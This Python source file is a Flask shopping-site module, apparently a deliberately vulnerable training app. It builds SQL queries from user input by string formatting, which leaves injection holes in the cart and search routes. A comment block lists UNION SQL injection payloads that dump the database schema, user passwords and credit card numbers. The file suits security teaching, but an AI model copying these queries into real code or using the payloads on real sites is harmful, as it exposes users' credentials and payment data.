from flask import Blueprint, render_template, session, request, redirect, url_for
from flaskr.models.User import User
from flaskr.forms import SearchForm, Reviews
import sqlite3, os
from flaskr import file_directory

shopping_blueprint = Blueprint('shopping', __name__)


@shopping_blueprint.route("/ShoppingCart", methods=["GET", "POST"])
def ShoppingCart():
    if 'username' in session:
        user = User(session['username'], session['email'], session['password'], session['question'], session['answer'])
    else:
        user = None

    if 'cart' in session:
        cart = session['cart']
    else:
        cart = []

    return render_template("shopping/ShoppingCart.html", user=user, cart=cart)


@shopping_blueprint.route("/Add/<productID>")
def addToCart(productID):
    if 'cart' in session:
        cart = session['cart']
    else:
        cart = []

    conn = sqlite3.connect(os.path.join(file_directory, "storage.db"))
    c = conn.cursor()
    c.execute(" SELECT * FROM products WHERE rowid='{}' ".format(productID))
    item = c.fetchone()
    conn.close()

    cart.append(item)
    session['cart'] = cart

    return redirect(url_for('shopping.ShoppingCart'))


@shopping_blueprint.route("/Products", methods=['POST', 'GET'])
def Products():
    if 'username' in session:
        user = User(session['username'], session['email'], session['password'], session['question'], session['answer'])
    else:
        user = None

    conn = sqlite3.connect(os.path.join(file_directory, "storage.db"))
    c = conn.cursor()

    c.execute("SELECT rowid, * FROM products")
    products = c.fetchall()
    conn.close()

    search = SearchForm(request.form)
    if request.method == "POST":
        # Pass product into url directly (Weak code)
        return redirect(url_for('shopping.Search', product=search.Search.data))

    return render_template("shopping/Products.html", user=user, form=search, products=products)


@shopping_blueprint.route("/Search/<product>", methods=['POST', 'GET'])
def Search(product):
    if 'username' in session:
        user = User(session['username'], session['email'], session['password'], session['question'], session['answer'])
    else:
        user = None

    # For search
    conn = sqlite3.connect(os.path.join(file_directory, "storage.db"))
    c = conn.cursor()
    c.execute("SELECT rowid, * FROM products WHERE name LIKE '%{}%'".format(product))
    results = c.fetchall()
    print(results)
    conn.close()
    """
    UNION SQL INJECTION

    EXFILTRATE DB SCHEMA
    ' UNION SELECT * FROM x-- (Error: No such table x)
    ' UNION SELECT '1' FROM sqlite_master-- (Error: SELECTs to the left and right of UNION do not have the same number of result columns)
    ' UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM sqlite_master-- (Returns all products)
    ' UNION SELECT '1', sql, '3', '4', '5', '6', '7', '8' FROM sqlite_master-- (Returns all tables in schema)

    (After knowing fields in user table)

    GET ALL USER CREDENTIALS 
    ' UNION SELECT '1', username, '3', '4', password, '6', '7', '8' FROM users--

    GET CREDIT CARD DETAILS
    ' UNION SELECT '1', ccnumber, '3', '4', cvv, '6', '7', '8' FROM paymentdetails--

    GET HIDDEN PRODUCTS
    ' UNION SELECT rowid, name, image, '4', cost_price, '6', '7', '8' FROM products--
    """

    # Search Form
    form = SearchForm(request.form)
    if request.method == "POST":
        # Pass prodduct into url directly (Weak code)
        return redirect(url_for('shopping.Search', product=form.Search.data))

    return render_template("shopping/Search.html", user=user, products=results, search=product, form=form)


@shopping_blueprint.route("/Vouchers")
def vouchers():
    if 'username' in session:
        user = User(session['username'], session['email'], session['password'], session['question'], session['answer'])
    else:
        user = None
    return render_template("shopping/Vouchers.html", user=user)
